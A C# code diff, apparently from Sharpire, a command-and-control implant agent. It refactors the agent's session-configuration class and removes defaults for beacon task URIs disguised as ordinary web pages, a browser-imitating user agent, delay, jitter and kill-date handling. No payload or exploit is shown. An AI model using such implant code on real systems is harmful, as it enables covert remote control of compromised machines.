@@ -61,11 +61,11 @@ namespace Sharpire
                 string message;
                 if(sessionInfo.GetKillDate().CompareTo(DateTime.Now) > 0)
                 {
-                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: past killdate";
+                    message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting: past killdate";
                 }
                 else
                 {
-                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: Lost limit reached";
+                    message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting: Lost limit reached";
                 }
 
                 ushort result = 0;
@@ -629,24 +629,10 @@ namespace Sharpire
             ControlServers = args[0].Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);
             StagingKey = args[1];
             AgentLanguage = args[2];
-
-            SetDefaults();
-        }
-
-        private void SetDefaults()
-        {
             StagingKeyBytes = Encoding.ASCII.GetBytes(StagingKey);
-            TaskURIs = new[] { "/admin/get.php","/news.php","/login/process.php" };
-            UserAgent = "(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
-            double DefaultJitter = 0.0;
-            uint DefaultDelay = 5;
-            uint DefaultLostLimit = 60;
-
+            TaskURIs = new string[] {};
+            UserAgent = "";
             StagerUserAgent = "";
-            if (string.IsNullOrEmpty(StagerUserAgent))
-            {
-                StagerUserAgent = UserAgent;
-            }
             StagerURI = "";
             Proxy = "default";
             ProxyCreds = "";
@@ -655,69 +641,65 @@ namespace Sharpire
         public string[] GetControlServers() { return ControlServers; }
         public string GetStagingKey() { return StagingKey; }
         public byte[] GetStagingKeyBytes() { return StagingKeyBytes; }
-        public string GetAgentLanguage() { return AgentLanguage; }
 
-        public string[] GetTaskURIs() { return TaskURIs; }
+        public string[] GetTaskUrIs() { return TaskURIs; }
         public string GetUserAgent() { return UserAgent; }
         public double GetDefaultJitter() { return DefaultJitter; }
-        public void SetDefaultJitter(double DefaultJitter)
+        public void SetDefaultJitter(double defaultJitter)
         {
-            this.DefaultJitter = DefaultJitter;
+            DefaultJitter = defaultJitter;
         }
         public uint GetDefaultDelay() { return DefaultDelay; }
-        public void SetDefaultDelay(uint DefaultDelay)
+        public void SetDefaultDelay(uint defaultDelay)
         {
-            this.DefaultDelay = DefaultDelay;
+            DefaultDelay = defaultDelay;
         }
         public uint GetDefaultLostLimit() { return DefaultLostLimit; }
-        public void SetDefaultLostLimit(uint DefaultLostLimit)
+        public void SetDefaultLostLimit(uint defaultLostLimit)
         {
-            this.DefaultLostLimit = DefaultLostLimit;
+            this.DefaultLostLimit = defaultLostLimit;
         }
         
-        public void SetDefaultResponse(string DefaultResponse) { this.DefaultResponse = DefaultResponse; }
+        public void SetDefaultResponse(string defaultResponse) { this.DefaultResponse = defaultResponse; }
         public string DefaultResponse { get; set; }
 
         public string GetDefaultResponse() { return DefaultResponse; }
 
         public string GetStagerUserAgent() { return StagerUserAgent; }
-        public string GetStagerURI() { return StagerURI; }
-        public string GetProxy() { return Proxy; }
-        public string GetProxyCreds() { return ProxyCreds; }
         public DateTime GetKillDate() { return KillDate; }
 
-        public void setProfile(string profile)
+        public void SetProfile(string profile)
         {
             TaskURIs = profile.Split('|').First().Split(',');
             UserAgent = profile.Split('|').Last();
         }
         
-        public void SetKillDate(string KillDate)
+        public void SetKillDate(string killDate)
         {
             Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
 
-            if (string.IsNullOrWhiteSpace(KillDate))
+            if (string.IsNullOrWhiteSpace(killDate))
             {
-                this.KillDate = DateTime.MaxValue; // High Date
+                KillDate = DateTime.MaxValue;
             }
-            else if (regex.Match(KillDate).Success)
+            else if (regex.Match(killDate).Success)
             {
-                DateTime.TryParse(KillDate, out this.KillDate);
+                DateTime.TryParse(killDate, out KillDate);
             }
         }
 
-        public void SetWorkingHours(string WorkingHours)
+        public void SetWorkingHours(string workingHours)
         {
             Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
 
-            if (string.IsNullOrWhiteSpace(WorkingHours))
+            if (string.IsNullOrWhiteSpace(workingHours))
             {
                 WorkingHoursStart = DateTime.Today.AddHours(0);   // 00:00
                 WorkingHoursEnd = DateTime.Today.AddHours(23).AddMinutes(59);  // 23:59
                 return;
             }
 
-            string[] times = WorkingHours.Split('-');
+            string[] times = workingHours.Split('-');
             if (times.Length == 2)
             {
                 string start = times[0].Trim();
@@ -734,10 +716,10 @@ namespace Sharpire
         public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
         public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }
 
-        public void SetAgentID(string AgentID) { this.AgentID = AgentID; }
-        public string GetAgentID() { return AgentID; }
+        public void SetAgentId(string AgentID) { this.AgentID = AgentID; }
+        public string GetAgentId() { return AgentID; }
 
-        public byte[] SetSessionKeyBytes(byte[] SessionKeyBytes) { return this.SessionKeyBytes = SessionKeyBytes; }
+        public byte[] SetSessionKeyBytes(byte[] sessionKeyBytes) { return this.SessionKeyBytes = sessionKeyBytes; }
         public string GetSessionKey() { return SessionKey; }
         public byte[] GetSessionKeyBytes() { return SessionKeyBytes; }
     }
